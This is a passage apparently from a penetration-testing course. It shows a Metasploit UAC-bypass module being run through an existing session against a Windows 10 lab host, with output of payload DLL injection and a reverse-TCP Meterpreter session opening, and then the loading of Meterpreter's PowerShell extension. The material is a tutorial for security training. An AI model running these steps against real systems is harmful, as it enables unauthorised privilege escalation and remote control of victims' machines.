and running **exploit** will essentially pipe the exploit through the active session to the vulnerable host:

```
msf5 > use exploit/windows/local/bypassac_injection_winsxs

msf5 exploit(windows/local/bypassac_injection_winsxs) > show options

Module options (exploit/windows/local/bypassac_injection_winsxs):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   SESSION                    yes      The session to run this module on.

Exploit target:

 Id  Name
 --  ----
  0   Windows x86

msf5 exploit(windows/local/bypassac_injection_winsxs) > set SESSION 10
SESSION => 10

msf5 exploit(windows/local/bypassac_injection_winsxs) > exploit
```

```
```text
[*] Started reverse TCP handler on 10.11.0.4:4444
[*] Windows 10 (Build 16299)., may be vulnerable.
[*] UAC is Enabled, checking level...
[*] Part of Administrators group! Continuing...
[*] UAC is set to Default
[*] BypassUAC can bypass this setting, continuing...
[*] Creating temporary folders...
[*] Uploading the Payload DLL to the filesystem...
[*] Spawning process with Windows Publisher Certificate, to inject into...
[*] Successfully injected payload into to process: 5800
[*] Sending stage (179779 bytes) to 10.11.0.22
[*] Meterpreter session 11 opened (10.11.0.4:4444 -> 10.11.0.22:53870)
meterpreter > 
```
```

Besides being able to background an active session and execute modules through it, we can also load extensions directly inside the active session with the **load** command.

One great example of this is the PowerShell extension, $^{717}$ which enables the use of PowerShell. With this module, we can execute PowerShell commands and scripts, or launch an interactive PowerShell command prompt. In Listing 801, we **load powershell** and list the available sub-commands.

```
meterpreter > load powershell
Loading extension powershell...Success.
```